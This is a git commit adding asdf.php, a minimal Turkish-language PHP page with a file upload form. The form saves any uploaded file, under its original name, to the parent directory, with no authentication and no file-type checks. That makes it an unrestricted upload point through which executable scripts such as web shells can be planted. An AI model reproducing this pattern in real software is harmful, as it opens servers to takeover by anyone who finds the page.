cd674d7cb30d0269bd764af174eab95a496e1435
tealpi32 <80133525+tealpi32@users.noreply.github.com>
2023-05-03 21:32:17 +0300

    Add files via upload

---
+++ asdf.php
@@ -0,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="tr" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>dosyayukle</title>
+  </head>
+  <body>
+    <form action="asdf.php" method="post" enctype="multipart/form-data">
+      <input type="file" name="file">
+      <button type="submit" name="button">Kaydet</button>
+      <?php
+
+      if (isset($_POST['button'])) {
+        $asdf = "../" . basename($_FILES['file']['name']);
+         $sonuc = move_uploaded_file($_FILES["file"]["tmp_name"], $asdf);
+      }
+
+       ?>
+    </form>
+  </body>
+</html>
